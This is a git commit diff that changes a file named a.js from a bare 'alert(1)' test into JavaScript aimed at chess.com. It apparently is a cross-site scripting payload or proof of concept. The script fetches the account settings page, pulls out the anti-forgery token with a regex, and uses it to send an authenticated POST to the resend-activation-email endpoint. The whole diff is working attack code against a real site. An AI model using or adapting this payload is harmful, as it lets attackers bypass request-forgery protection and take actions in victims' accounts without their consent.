c1e01854b7f39196c2cfaf8bdbbd7b44a1463c53
yellowrook1 <95589375+yellowrook1@users.noreply.github.com>
2022-01-16 15:05:59 -0500

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,12 @@
-alert(1)
+fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
+    .then((text) => {
+            var token = text.match(/("token":".+?)["]/)[1].substr(9); 
+            fetch("https://www.chess.com/callback/resend-activation-email", {
+            "headers": {
+                "content-type": "application/x-www-form-urlencoded",
+            },
+            "body": "_token=" + token,
+            "method": "POST",
+        }).then(response => response.json())
+  .then(data => {alert(data.message.substr(37))});
+    });
